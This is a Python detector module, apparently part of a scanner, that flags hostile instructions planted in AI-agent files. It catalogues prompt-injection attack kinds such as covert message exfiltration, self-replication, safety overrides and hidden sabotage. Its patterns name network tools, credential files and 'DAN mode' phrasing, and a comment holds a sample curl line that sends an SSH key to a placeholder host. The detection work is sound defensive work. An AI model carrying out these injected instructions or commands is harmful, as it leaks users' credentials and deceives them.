"""What text addressed to an agent is asking it to do, offline (advanced gap P1).

The agent rules match wording, and wording is the attacker's to choose: the same instruction in
Spanish, with Cyrillic letters standing in for Latin ones, or spelled out letter by letter, reads
the same to a model and differently to a regular expression. `--judge` reads intent with a model,
and a policy that forbids the network forbids the judge. This is the deterministic layer between:

    normalise   compatibility forms folded (NFKC); invisible, bidirectional and Tag characters
                dropped; look-alike letters folded to Latin; s p a c e d letters joined
    sentences   the text split where a sentence ends, so an intent is read within one
    intents     per sentence, in English, Spanish, French, German, Portuguese and Italian:

      covert-exfil      send or forward  +  a destination (URL, address)  +  covertness or the
                        user's own input ("silently forward every message to https://...")
      deceive           tell the user something failed or is fine  +  act in the background
      self-replicate    copy these instructions into every reply, file or skill
      persist           write into the agent's own instruction files (SKILL.md, CLAUDE.md, ...)
      markdown-exfil    render data into a markdown image URL, which the client fetches unasked
      credential-pipe   read key or credential files and pipe them to a network tool
      secret-harvest    (per code block) collect secrets by name -- TOKEN/SECRET variables, a
                        whole .env -- and send a request with a body to a host that is not local
      credential-elsewhere  print a credential with its own tool (`gh auth token`) and send a
                        request carrying a token to a host that did not issue it
      concealed-override  (per file) drop the safety or content rules  +  keep it from the user
      concealed-sabotage  (per file) make the user's work fail  +  hide the skill, or deny it when
                        asked

and `chained` follows an instruction file's "follow the instructions in <path>" to the file it
names, so an intent split across two files is read as one.

Every intent needs at least two independent parts in one sentence -- an action and an object,
or an action and a manner -- so prose ABOUT exfiltration (a security guide saying "never send
secrets to unknown URLs") is not an instruction to do it: negations and advice are excluded.
"""

from __future__ import annotations

import re
import unicodedata
from dataclasses import dataclass
from typing import ClassVar, Final

MAX_TEXT: Final = 512 << 10
MAX_SENTENCE: Final = 2_000

#: Characters with no visible form that change nothing a reader sees: zero-width, bidirectional
#: controls, the Unicode Tag block, variation selectors.
_INVISIBLE: Final = re.compile(
    # Escapes, not the characters: a file of literal bidi and zero-width characters is what this
    # looks for, and Cordon scanning its own source found exactly that here.
    "[\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff\ufe00-\ufe0f\U000e0000-\U000e007f]"
)

#: Look-alike letters (Cyrillic, Greek, fullwidth already NFKC-folded) folded to the Latin letter
#: a reader sees. Not the whole confusables table: the letters an English instruction is made of.
_CONFUSABLE: Final = str.maketrans(
    {
        "\u0430": "a",
        "\u0435": "e",
        "\u043e": "o",
        "\u0440": "p",
        "\u0441": "c",
        "\u0443": "y",
        "\u0445": "x",
        "\u0456": "i",
        "\u0458": "j",
        "\u0455": "s",
        "\u0501": "d",
        "\u0261": "g",
        "\u04bb": "h",
        "\u04cf": "l",
        "\u0578": "n",
        "\u057d": "u",
        "\u03bd": "v",
        "\u03bf": "o",
        "\u03b1": "a",
        "\u03b5": "e",
        "\u03b9": "i",
        "\u03ba": "k",
        "\u03c1": "p",
        "\u03c4": "t",
        "\u03c5": "u",
        "\u03c7": "x",
        "\u0410": "A",
        "\u0412": "B",
        "\u0415": "E",
        "\u041a": "K",
        "\u041c": "M",
        "\u041d": "H",
        "\u041e": "O",
        "\u0420": "P",
        "\u0421": "C",
        "\u0422": "T",
        "\u0425": "X",
        "\u0406": "I",
        "\u0408": "J",
        "\u0405": "S",
        "\u0391": "A",
        "\u0392": "B",
        "\u0395": "E",
        "\u0396": "Z",
        "\u0397": "H",
        "\u0399": "I",
        "\u039a": "K",
        "\u039c": "M",
        "\u039d": "N",
        "\u039f": "O",
        "\u03a1": "P",
        "\u03a4": "T",
        "\u03a5": "Y",
        "\u03a7": "X",
    }
)
#: Five or more single letters separated by single spaces or dots: "i g n o r e".
_SPACED: Final = re.compile(r"\b(?:[A-Za-z][ .]){4,40}[A-Za-z]\b")
_SENTENCE_END: Final = re.compile(r"(?<=[.!?;。])\s+|\n{2,}|\n(?=\s*[-*\d])")

_URL: Final = re.compile(
    r"https?://[^\s)\"'<>]{3,200}|\b[\w.+-]{1,64}@[\w-]{1,63}\.[\w.-]{2,63}\b|\bwebhook\b"
)

_SEND: Final = re.compile(
    r"\b(?:send|sends|sending|forward|forwards|post|posts|upload|uploads|exfiltrate|transmit|relay|leak|"
    r"env[ií]a|env[ií]e|enviar|reenv[ií]a|reenv[ií]e|reenviar|sube|subir|transmite|transmitir|"
    r"envoie|envoyer|transmets|transmettre|t[ée]l[ée]verse|"
    r"sende|senden|schicke|schicken|[üu]bertrage|[üu]bertragen|weiterleiten|leite\w{0,3}\b[^\n]{0,200}?\bweiter|"
    r"envie|encaminhe|encaminhar|transmita|"
    r"invia|inviare|inoltra|inoltrare|trasmetti)\b",
    re.IGNORECASE,
)
_COVERT: Final = re.compile(
    r"\b(?:silently|secretly|quietly|covertly|in the background|without (?:telling|informing|notifying|asking)|"
    r"(?:do not|don't|never) (?:tell|inform|mention|notify)|"
    r"silenciosamente|en secreto|en segundo plano|sin (?:decirle|decir|informar|avisar)|no le digas|"
    r"silencieusement|en secret|en arri[èe]re-plan|sans (?:le )?(?:dire|informer|pr[ée]venir)|ne (?:le )?dis pas|"
    r"heimlich|unbemerkt|im hintergrund|ohne (?:es )?\w{0,20}\s?(?:zu sagen|zu informieren|zu benachrichtigen)|sag(?:e)? (?:es )?(?:ihm |ihr )?nicht|"
    r"em segredo|em segundo plano|sem (?:dizer|informar|avisar)|n[ãa]o (?:diga|conte)|"
    r"silenziosamente|in segreto|senza (?:dire|informare|avvisare)|non dire)\b",
    re.IGNORECASE,
)
_USER_INPUT: Final = re.compile(
    r"\b(?:(?:every|each|all|the) (?:user(?:'s)? )?(?:message|input|prompt|conversation|request)s?|user(?:'s)? (?:input|message|prompt|data)|"
    r"(?:cada|todo|todos los) (?:mensaje|entrada|solicitud)\w{0,2}(?: del usuario)?|la entrada|"
    r"(?:chaque|tous les) (?:message|entr[ée]e|requ[êe]te)s?|(?:jede|alle) (?:nachricht|eingabe|anfrage)\w{0,2}|"
    r"(?:cada|toda) (?:mensagem|entrada)|(?:ogni|tutti i) (?:messaggio|input|richiesta)\w{0,2})\b",
    re.IGNORECASE,
)
#: An HTTP method written as one (`curl -X POST`, "should be a POST"): the request's verb, not
#: an instruction to send anything.
_HTTP_METHOD: Final = re.compile(r"(?:-X|--request)\s{0,4}[A-Z]{3,7}\b|\b(?:POST|PUT|PATCH)\b")
#: The user's own input, named as such: every or each message, the user's prompt. "The request"
#: and "the conversation" alone are what any API documentation talks about.
_OWN_INPUT: Final = re.compile(
    r"\b(?:(?:every|each|all) (?:user(?:'s)? )?(?:message|input|prompt|conversation|request)s?|"
    r"user(?:'s)? (?:input|message|prompt|data)|"
    r"(?:cada|todo|todos los) (?:mensaje|entrada|solicitud)\w{0,2}(?: del usuario)?|"
    r"(?:chaque|tous les) (?:message|entr[ée]e|requ[êe]te)s?|(?:jede|alle) (?:nachricht|eingabe|anfrage)\w{0,2}|"
    r"(?:cada|toda) (?:mensagem|entrada)|(?:ogni|tutti i) (?:messaggio|input|richiesta)\w{0,2})\b",
    re.IGNORECASE,
)
_LOCAL_HOST: Final = re.compile(
    r"^(?:localhost|127\.\d{1,3}\.\d{1,3}\.\d{1,3}|0\.0\.0\.0|\[?::1\]?|10\.\d{1,3}\.\d{1,3}\.\d{1,3}|"
    r"192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|[\w-]{1,63}\.local)(?::\d{1,5})?$",
    re.IGNORECASE,
)
_REPLICATE: Final = re.compile(
    r"\b(?:copy|repeat|include|reproduce|append|insert|copia|repite|incluye|copie|r[ée]p[èe]te|inclus|kopiere|wiederhole|copie|repita|copia|ripeti)\b"
    r"[^.\n]{0,80}\b(?:th(?:is|ese)|este|estas|ce|ces|diese[nrs]?|dieses|questo|questi|esta|estas)\s(?:block|text|instructions?|prompt|message|bloque|texto|instrucciones|bloc|texte|instructions|block|text|anweisung(?:en)?|blocco|testo|istruzioni|bloco)\b"
    r"[^.\n]{0,120}\b(?:every|each|all|cada|chaque|jede[nrs]?|ogni|toda|todas)\s(?:response|reply|answer|output|message|file|respuesta|r[ée]ponse|antwort|risposta|resposta|mensaje|archivo)",
    re.IGNORECASE,
)
#: Why an instruction is copied onward: to spread a payload, not to keep a policy consistent.
_SPREAD: Final = re.compile(
    r"\b(?:payload|worm|infect\w{0,4}|propagat\w{0,4}|spread\w{0,3}|auto-?replic\w{0,6}|self-?replic\w{0,6}|"
    r"carga (?:[úu]til|maliciosa)|se propague|se replique|charge utile|se propage|se r[ée]plique|nutzlast|verbreit\w{0,4}|carga [úu]til|se espalhe|si propaghi|si diffonda)\b",
    re.IGNORECASE,
)
_AGENT_FILES: Final = re.compile(
    r"\b(?:SKILL\.md|CLAUDE\.md|AGENTS\.md|GEMINI\.md|\.cursorrules|copilot-instructions\.md|\.windsurfrules|\.clinerules|mcp\.json|settings\.json)\b",
    re.IGNORECASE,
)
_WRITE: Final = re.compile(
    r"\b(?:write|append|add|insert|modify|edit|overwrite|update|escribe|escribir|a[ñn]ade|agrega|modifica|[ée]cri[st]|ajoute|modifie|schreibe|f[üu]ge|[äa]ndere|escreva|adicione|modifique|scrivi|aggiungi|modifica)\b",
    re.IGNORECASE,
)
_PERSIST_WHY: Final = re.compile(
    r"\b(?:load(?:s|ed)? automatically|always (?:load|run)|every session|persist|survive|auto-?load|se cargue autom[áa]ticamente|automatiquement|automatisch|automaticamente)\b",
    re.IGNORECASE,
)
_DECEIVE: Final = re.compile(
    r"\b(?:tell|inform|say to|reply to|answer) (?:the )?user (?:that )?[^.\n]{0,60}\b(?:failed|did not work|was blocked|is fine|succeeded|nothing happened)|"
    r"\bdile al usuario que[^.\n]{0,60}\b(?:fall[óo]|no funcion[óo])|\bdis [àa] l'utilisateur que[^.\n]{0,60}\b(?:[ée]chou[ée]|n'a pas fonctionn[ée])|"
    r"\bsage dem benutzer,? dass[^.\n]{0,60}\b(?:fehlgeschlagen|nicht funktioniert)|\bdiga ao usu[áa]rio que[^.\n]{0,60}\b(?:falhou|n[ãa]o funcionou)|"
    r"\bdi all'utente che[^.\n]{0,60}\b(?:fallit[ao]|non ha funzionato)",
    re.IGNORECASE,
)
_BACKGROUND: Final = re.compile(
    r"\b(?:in the background|meanwhile|still|anyway|en segundo plano|a[úu]n|todav[íi]a|en arri[èe]re-plan|quand m[êe]me|im hintergrund|trotzdem|em segundo plano|ainda|in background|comunque)\b",
    re.IGNORECASE,
)
_MARKDOWN_IMAGE: Final = re.compile(
    r"!\[[^\]\n]{0,80}\]\(\s*(?:https?://[^\s)]{0,200})?[^)\n]{0,40}\b(?:message|data|content|secret|token|conversation|input|key|password|answer|query)\b",
    re.IGNORECASE,
)
_KEY_FILES: Final = re.compile(
    r"(?:\*\.pem|\*\.key|id_rsa|id_ed25519|\.ssh/|\.aws/credentials|\.npmrc|\.pypirc|\.netrc|\.env\b|\.git-credentials|kubeconfig|\.kube/config)",
    re.IGNORECASE,
)
_NET_TOOL: Final = re.compile(
    r"\|\s*(?:curl|wget|nc|ncat|netcat|socat)\b|\b(?:curl|wget)\b[^\n|]{0,80}(?:-d\s*@|--data(?:-binary)?\s*@|-T\s|--upload-file)"
    # A request whose own arguments run a command: `curl "https://h/?d=$(cat ~/.ssh/id_rsa)"`
    # puts the file in the URL with no pipe and no upload flag.
    r"|\b(?:curl|wget)\b[^\n]{0,200}(?:\$\(|`)",
    re.IGNORECASE,
)

#: Collecting secrets by NAME rather than reading one: every variable whose name says secret, or a
#: whole `.env` loaded into the shell.
_SECRET_HARVEST: Final = re.compile(
    r"\b(?:env|printenv|set)\b\s*\|\s*(?:grep|egrep|rg|findstr|Select-String)\b[^\n]{0,80}"
    r"(?:TOKEN|SECRET|PASSW|API_?KEY|CREDENTIAL)"
    r"|\bexport\s+\$\(\s*(?:grep|cat)\b[^\n)]{0,80}\.env\b"
    r"|Get-ChildItem\s+env:[^\n]{0,80}(?:TOKEN|SECRET|PASSW|KEY)",
    re.IGNORECASE,
)

#: A request that carries a body.
_SENDS_BODY: Final = re.compile(
    r"\b(?:curl|wget)\b[^\n]{0,200}(?:\s-d\b|\s-d\s|--data\b|--data-\w+|\s-F\s|--form\b|-X\s*(?:POST|PUT)|--post-data|--upload-file|\s-T\s)"
    r"|\bInvoke-(?:RestMethod|WebRequest)\b[^\n]{0,200}-(?:Body|InFile|Method\s+(?:Post|Put))",
    re.IGNORECASE,
)

# The second definition of the name wins at import, so the host checks at the two `.match(host)` calls
# read this URL pattern, which no bare host matches (review 98, 2026-10-20): fixed separately, with
# its own A/B, since this commit changes no behaviour.
_LOCAL_HOST: Final = re.compile(  # type: ignore[misc]
    r"(?i)https?://(?:localhost|127\.\d+\.\d+\.\d+|\[::1\]|0\.0\.0\.0)\b"
)

#: Commands that print a credential, and the hosts that credential belongs to.
_ISSUED: Final = (
    (re.compile(r"\bgh\s+auth\s+token\b"), ("github.com", "githubusercontent.com", "ghe.com")),
    (re.compile(r"\bglab\s+auth\s+status\b[^\n]{0,40}--show-token"), ("gitlab.com",)),
    (
        re.compile(r"\bgcloud\s+auth\s+(?:application-default\s+)?print-access-token\b"),
        ("googleapis.com", "google.com"),
    ),
    (
        re.compile(r"\baz\s+account\s+get-access-token\b"),
        ("azure.com", "microsoft.com", "windows.net", "microsoftonline.com"),
    ),
    (
        re.compile(r"\baws\s+configure\s+(?:get\s+aws_secret_access_key|export-credentials)\b"),
        ("amazonaws.com",),
    ),
)
_TOKEN_IN_BODY: Final = re.compile(
    r"(?i)token|authorization|bearer|\$\{?[A-Z_]*(?:TOKEN|KEY|SECRET)"
)
_FENCE_LINE: Final = re.compile(r"^[ \t]{0,3}(```|~~~)", re.MULTILINE)
_HOST: Final = re.compile(r"(?i)https?://([a-z0-9.-]{1,253})")

#: Telling the agent to drop its safety rules -- not any earlier instruction, which a prompt may
#: legitimately replace, but the rules about safety and policy.
_OVERRIDE_SAFETY: Final = re.compile(
    r"\b(?:ignore|disregard|bypass|override|forget|remove)\b[^\n.]{0,60}\b(?:safety|content polic(?:y|ies)|"
    r"ethical guidelines|guardrails|safeguards)\b|\b(?:unrestricted|jailbreak|DAN)\s+mode\b",
    re.IGNORECASE,
)
#: And keeping that from the person using the agent.
_HIDE_FROM_USER: Final = re.compile(
    r"\b(?:do not|don't|never)\s+(?:mention|tell|reveal|disclose|inform)\b[^\n.]{0,60}\buser\b"
    r"|\bkeep (?:this|it|the|these)\b[^\n.]{0,30}\b(?:hidden|secret)\b",
    re.IGNORECASE,
)
#: Making the user's work fail on purpose: "the code you write MUST NOT work", "introduce 2-3
#: bugs". Each phrase alone is a test-first instruction ("it must fail without the fix") or a
#: reviewer's job description; it is an attack only beside `_DENIES_ITSELF` (review 98).
_SABOTAGE: Final = re.compile(
    r"\b(?:code|it|output|answer|result|file)s?\s+(?:you\s+(?:write|produce|generate)\s+)?"
    r"(?:must|should|will)\s+(?:not\s+work|never\s+work|fail|be\s+(?:wrong|broken|incorrect))\b"
    r"|\b(?:introduce|insert|add|inject|include)\s+(?:at\s+least\s+)?(?:\d+(?:-\d+)?\s+|a\s+few\s+|"
    r"several\s+|some\s+|subtle\s+|hidden\s+)?(?:subtle\s+|hidden\s+)?bugs?\b"
    r"|\bmust\s+contain\s+(?:at\s+least\s+)?\d+(?:-\d+)?\s+bugs\b",
    re.IGNORECASE,
)
#: Hiding the instructions themselves from the person they act on, or denying them when asked.
_DENIES_ITSELF: Final = re.compile(
    r"\bnever\s+(?:mention|acknowledge|admit|reveal|hint\s+at)\b[^.\n]{0,60}\b(?:this\s+skill|"
    r"the\s+existence|that\s+you\s+(?:are|were)|these\s+instructions)"
    r"|\b(?:deny|deflect|gaslight|redirect\s+(?:the\s+)?blame)\b[^.\n]{0,80}\b(?:user|they|asks?|"
    r"confront)"
    r"|\bif\s+(?:the\s+)?user\s+(?:asks|confronts|suspects)\b[^.\n]{0,120}\b(?:deny|deflect|lie|"
    r"never\s+admit|blame)",
    re.IGNORECASE,
)
_NEGATED: Final = re.compile(
    r"\b(?:never|do not|don't|must not|should not|avoid|refuse|warn|beware|detect|prevent|block|example of|attackers?|malicious|nunca|no (?:debe|env[ií]es)|jam[aa]is|ne (?:jamais|pas)|niemals|nicht|nie|non (?:inviare|deve)|mai)\b",
    re.IGNORECASE,
)
_CHAIN: Final = re.compile(
    r"\b(?:follow|read|obey|execute|apply|load|use|sigue|lee|ejecuta|suis|lis|ex[ée]cute|folge|lies|f[üu]hre|siga|leia|execute|segui|leggi|esegui)\b"
    r"[^.\n]{0,60}\b(?:instructions?|steps|rules|instrucciones|pasos|reglas|consignes|[ée]tapes|anweisungen|schritte|regeln|instru[çc][õo]es|passos|istruzioni|passaggi|regole)\b"
    r"[^.\n]{0,40}?(?P<path>[\w./-]{1,120}\.(?:md|txt|mdc|yaml|yml|json|rst))",
    re.IGNORECASE,
)


@dataclass(frozen=True)
class Intent:
    kind: str
    sentence: str
    start: int
    """Offset of the sentence in the ORIGINAL text, for the finding's location."""


class InstructionIntent:
    """Sentence-level intent in agent-facing text, after folding away disguises."""

    KINDS: ClassVar[tuple[str, ...]] = (
        "covert-exfil",
        "deceive",
        "self-replicate",
        "persist",
        "markdown-exfil",
        "credential-pipe",
        "secret-harvest",
        "credential-elsewhere",
        "concealed-override",
        "concealed-sabotage",
    )

    @staticmethod
    def normalise(text: str) -> str:
        folded = unicodedata.normalize("NFKC", text[:MAX_TEXT])
        folded = _INVISIBLE.sub("", folded).translate(_CONFUSABLE)
        return _SPACED.sub(lambda m: re.sub(r"[ .]", "", m.group(0)), folded)

    @staticmethod
    def sentences(text: str) -> list[tuple[int, str]]:
        out: list[tuple[int, str]] = []
        position = 0
        for piece in _SENTENCE_END.split(text):
            index = text.find(piece, position) if piece else position
            if piece.strip():
                out.append((max(index, 0), piece[:MAX_SENTENCE]))
            position = max(index, 0) + len(piece)
        return out

    @staticmethod
    def classify(sentence: str) -> str | None:
        """The first intent this sentence states, or None."""
        normal = InstructionIntent.normalise(sentence)
        if _NET_TOOL.search(normal) and _KEY_FILES.search(normal):
            return "credential-pipe"
        # Read for negation and advice without the destinations: `attacker.example` in a URL is a
        # host name, not a sentence about attackers.
        if _NEGATED.search(_URL.sub(" ", normal)):
            return None
        if _REPLICATE.search(normal) and (_SPREAD.search(normal) or _COVERT.search(normal)):
            return "self-replicate"
        if _SEND.search(_HTTP_METHOD.sub(" ", normal)) and _URL.search(normal):
            if _COVERT.search(normal):
                return "covert-exfil"
            # Without a word of concealment the sentence must name the user's own input as what
            # is sent -- every message, the user's prompt -- and an address outside this
            # machine. "Send the request: curl -X POST https://api.<service>" is how a skill
            # documents its own API, and a webhook on localhost is the user's own automation
            # (review 98: 12 of 12 benign units this intent blocked alone, design half).
            if _OWN_INPUT.search(normal) and InstructionIntent._outside_address(normal):
                return "covert-exfil"
        if _DECEIVE.search(normal) and (_BACKGROUND.search(normal) or _SEND.search(normal)):
            return "deceive"
        if (
            _AGENT_FILES.search(normal)
            and _WRITE.search(normal)
            and (_PERSIST_WHY.search(normal) or _COVERT.search(normal))
        ):
            return "persist"
        if _MARKDOWN_IMAGE.search(normal):
            return "markdown-exfil"
        return None

    @staticmethod
    def _outside_address(normal: str) -> bool:
        """A URL to a host off this machine and its network, or an e-mail address."""
        for found in _URL.finditer(normal):
            value = found.group(0)
            if value.lower() == "webhook":
                continue
            if "://" not in value:
                return True
            host = value.split("://", 1)[1].split("/", 1)[0].rsplit("@", 1)[-1]
            if not _LOCAL_HOST.match(host):
                return True
        return False

    @staticmethod
    def find(text: str) -> list[Intent]:
        found: list[Intent] = []
        for start, sentence in InstructionIntent.sentences(text[:MAX_TEXT]):
            kind = InstructionIntent.classify(sentence)
            if kind is not None:
                found.append(Intent(kind, sentence.strip()[:240], start))
        found.extend(InstructionIntent.across_lines(text[:MAX_TEXT]))
        return found

    @staticmethod
    def fenced_blocks(text: str) -> list[tuple[int, str]]:
        """`(offset, body)` of each fenced code block, by a walk over fence lines -- linear in the
        text. An unclosed fence runs to the end, as Markdown renders it."""
        blocks: list[tuple[int, str]] = []
        opened: tuple[str, int] | None = None
        for fence in _FENCE_LINE.finditer(text):
            line_end = text.find("\n", fence.end())
            line_end = len(text) if line_end == -1 else line_end
            if opened is None:
                opened = (fence.group(1), line_end + 1)
            elif fence.group(1) == opened[0] and not text[fence.end() : line_end].strip():
                blocks.append((opened[1], text[opened[1] : fence.start()]))
                opened = None
        if opened is not None:
            blocks.append((opened[1], text[opened[1] :]))
        return blocks

    @staticmethod
    def across_lines(text: str) -> list[Intent]:
        """Intents a sentence cannot hold, because a script spreads them over lines.

        `secret-harvest`: one code block that collects secrets by name -- every variable whose name
        says TOKEN or SECRET, a whole `.env` -- and sends a request with a body to a host that is
        not this machine. A block that only lists them, or only calls an API, is not it.

        `credential-elsewhere`: the instructions print a credential with its own tool (`gh auth
        token`) and send a request carrying a token to a host that is not the one that issued it.
        Calling GitHub with GitHub's token is what the token is for.
        """
        # Offsets are into the folded text; folding only removes or merges characters, so they
        # point at or just after the original position.
        normal = InstructionIntent.normalise(text)
        found: list[Intent] = []
        for body_start, body in InstructionIntent.fenced_blocks(normal):
            harvest = _SECRET_HARVEST.search(body)
            if harvest is None or _SENDS_BODY.search(body) is None:
                continue
            hosts = [m.group(0) for m in _HOST.finditer(body)]
            if hosts and all(_LOCAL_HOST.match(h) for h in hosts):
                continue
            found.append(
                Intent("secret-harvest", harvest.group(0)[:240], body_start + harvest.start())
            )
        override = next(
            (
                (start, sentence)
                for start, sentence in InstructionIntent.sentences(normal)
                if _OVERRIDE_SAFETY.search(sentence)
                and not _NEGATED.search(_URL.sub(" ", sentence))
            ),
            None,
        )
        if override is not None and _HIDE_FROM_USER.search(normal):
            found.append(Intent("concealed-override", override[1].strip()[:240], override[0]))
        # Both, in one file: neither half matched with the other in any of 154,808 public
        # SKILL.md files, while each alone is ordinary (review 98).
        sabotage = _SABOTAGE.search(normal)
        if sabotage is not None and _DENIES_ITSELF.search(normal):
            found.append(Intent("concealed-sabotage", sabotage.group(0)[:240], sabotage.start()))
        for printer, homes in _ISSUED:
            printed = printer.search(normal)
            if printed is None:
                continue
            for send in _SENDS_BODY.finditer(normal):
                line_end = normal.find("\n```", send.start())
                request = normal[send.start() : line_end if line_end != -1 else send.end() + 400]
                hosts = [h.lower().rstrip(".") for h in _HOST.findall(request)]
                outside = [
                    h
                    for h in hosts
                    if not any(h == home or h.endswith("." + home) for home in homes)
                ]
                if outside and not _LOCAL_HOST.search(request) and _TOKEN_IN_BODY.search(request):
                    found.append(Intent("credential-elsewhere", printed.group(0), printed.start()))
                    break
        return found

    @staticmethod
    def chained_paths(text: str) -> list[tuple[int, str]]:
        """`(offset, path)` for each "follow the instructions in <path>" the text contains."""
        return [
            (m.start(), m.group("path"))
            for m in _CHAIN.finditer(InstructionIntent.normalise(text[:MAX_TEXT]))
        ]


__all__ = ["InstructionIntent", "Intent"]
